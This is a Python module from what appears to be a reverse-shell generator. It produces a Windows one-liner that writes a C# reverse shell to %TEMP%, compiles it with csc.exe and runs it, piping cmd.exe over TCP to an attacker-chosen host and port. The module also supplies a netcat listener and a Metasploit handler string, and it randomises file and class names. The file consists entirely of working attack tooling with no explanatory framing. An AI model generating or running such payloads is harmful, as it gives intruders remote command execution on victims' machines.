import random
import string
from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler


def _rand_name(length: int) -> str:
    first = random.choice(string.ascii_uppercase)
    rest = "".join(random.choices(string.ascii_letters + string.digits, k=length - 1))
    return first + rest


class CSharpGenerator(ShellGenerator):
    language = "csharp"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        variant = "inline_compile"

        # Choose temp filename base and class name
        if names:
            tmp_base = names.get()
            class_name = _rand_name(random.randint(4, 6))
        else:
            tmp_base = "shell"
            class_name = "C"

        source = self._build_source(opts, class_name)
        # Collapse to a single line safe for cmd echo
        source_line = source.replace("\n", "").replace('"', '\\"')

        cmd = (
            f'echo {source_line} > %TEMP%\\{tmp_base}.cs && '
            f'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe '
            f'/nologo /out:%TEMP%\\{tmp_base}.exe %TEMP%\\{tmp_base}.cs && '
            f'%TEMP%\\{tmp_base}.exe'
        )

        listener = (
            f"rlwrap nc -lvnp {opts.lport}\n"
            f"# Requires .NET Framework 4.x on target\n"
            f"# 32-bit fallback: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe"
        )

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=listener,
            tty_upgrade=None,
            msf_compat=msf_handler("windows/shell_reverse_tcp", opts.lhost, opts.lport),
        )

    def _build_source(self, opts: ShellOptions, class_name: str) -> str:
        return (
            "using System;"
            "using System.Net.Sockets;"
            "using System.Diagnostics;"
            "using System.IO;"
            f"class {class_name}{{"
            "static void Main(){"
            f"var t=new TcpClient(\"{opts.lhost}\",{opts.lport});"
            "var s=t.GetStream();"
            "var p=new Process();"
            "p.StartInfo.FileName=\"cmd.exe\";"
            "p.StartInfo.UseShellExecute=false;"
            "p.StartInfo.RedirectStandardInput=true;"
            "p.StartInfo.RedirectStandardOutput=true;"
            "p.StartInfo.RedirectStandardError=true;"
            "p.Start();"
            "System.Threading.Tasks.Task.Run(()=>"
            "{var b=new byte[65535];int n;"
            "while((n=s.Read(b,0,b.Length))>0)"
            "p.StandardInput.BaseStream.Write(b,0,n);});"
            "System.Threading.Tasks.Task.Run(()=>"
            "{var b=new byte[65535];int n;"
            "while((n=p.StandardOutput.BaseStream.Read(b,0,b.Length))>0)"
            "s.Write(b,0,n);});"
            "System.Threading.Tasks.Task.Run(()=>"
            "{var b=new byte[65535];int n;"
            "while((n=p.StandardError.BaseStream.Read(b,0,b.Length))>0)"
            "s.Write(b,0,n);});"
            "p.WaitForExit();t.Close();}}"
        )
